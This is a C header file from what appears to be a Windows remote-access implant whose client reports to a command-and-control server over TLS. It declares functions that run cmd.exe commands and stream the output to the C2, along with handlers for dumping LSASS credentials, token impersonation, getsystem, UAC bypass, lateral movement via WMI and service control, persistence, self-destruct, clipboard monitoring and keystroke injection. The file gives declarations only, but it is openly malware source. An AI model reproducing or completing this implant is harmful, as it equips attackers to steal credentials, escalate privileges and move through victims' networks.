/*
 * client/shell_internal.h  –  Private declarations shared across shell handler files
 * ====================================================================================
 * This header is NOT part of the public API — it is only included by
 * shell.c, handlers_system.c, handlers_ui.c, and handlers_lateral.c.
 *
 * It exposes:
 *   • _send_str()   — send a C string back to the C2 over TLS
 *   • _shell_exec() — run a cmd.exe command and stream output back
 *
 * Both are defined in shell.c and referenced by all handler files.
 */

#pragma once
#ifndef SHELL_INTERNAL_H
#define SHELL_INTERNAL_H

#include "../core/config.h"
#include "../../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Send a plain text string to the C2 (defined in shell.c) */
void _send_str(TLS_CONTEXT *pTls, const char *msg);

/* Run a shell command via _popen and stream output to C2 (defined in shell.c) */
void _shell_exec(TLS_CONTEXT *pTls, const char *cmd);

/* Not-supported stub (defined in shell.c) */
void _not_supported(TLS_CONTEXT *pTls, const char *verb);

/* ── Handler declarations (defined in handlers_*.c) ─────────────────────── */

/* handlers_system.c */
void _handle_sysinfo       (TLS_CONTEXT *pTls);
void _handle_os_info       (TLS_CONTEXT *pTls);
void _handle_cd            (TLS_CONTEXT *pTls, const char *path);
void _handle_ls            (TLS_CONTEXT *pTls, const char *path);
void _handle_ps            (TLS_CONTEXT *pTls);
void _handle_kill          (TLS_CONTEXT *pTls, const char *args);
void _handle_env           (TLS_CONTEXT *pTls, const char *filter);
void _handle_idle_time     (TLS_CONTEXT *pTls);
void _handle_lock_screen   (TLS_CONTEXT *pTls);
void _handle_active_windows(TLS_CONTEXT *pTls);

/* handlers_ui.c */
void _handle_getclip      (TLS_CONTEXT *pTls);
void _handle_setclip      (TLS_CONTEXT *pTls, const char *text);
void _handle_msgbox       (TLS_CONTEXT *pTls, const char *args);
void _handle_upload       (TLS_CONTEXT *pTls, const char *filename);
void _handle_download     (TLS_CONTEXT *pTls, const char *path);
void _handle_persist      (TLS_CONTEXT *pTls, const char *args);
void _handle_self_destruct(TLS_CONTEXT *pTls);
void _handle_run_psh      (TLS_CONTEXT *pTls, const char *psCmd);
void _handle_open_url     (TLS_CONTEXT *pTls, const char *url);
void _handle_set_wallpaper(TLS_CONTEXT *pTls, const char *path);
void _handle_mouse_move   (TLS_CONTEXT *pTls, const char *args);
void _handle_type_keys    (TLS_CONTEXT *pTls, const char *text);
void _handle_clip_watch   (TLS_CONTEXT *pTls);

/* handlers_lateral.c */
void _handle_dump_lsass        (TLS_CONTEXT *pTls);
void _handle_token_impersonate (TLS_CONTEXT *pTls, const char *args);
void _handle_token_revert      (TLS_CONTEXT *pTls);
void _handle_getsystem         (TLS_CONTEXT *pTls);
void _handle_uac_bypass        (TLS_CONTEXT *pTls, const char *args);
void _handle_lateral_wmi       (TLS_CONTEXT *pTls, const char *args);
void _handle_lateral_sc        (TLS_CONTEXT *pTls, const char *args);

#endif /* SHELL_INTERNAL_H */
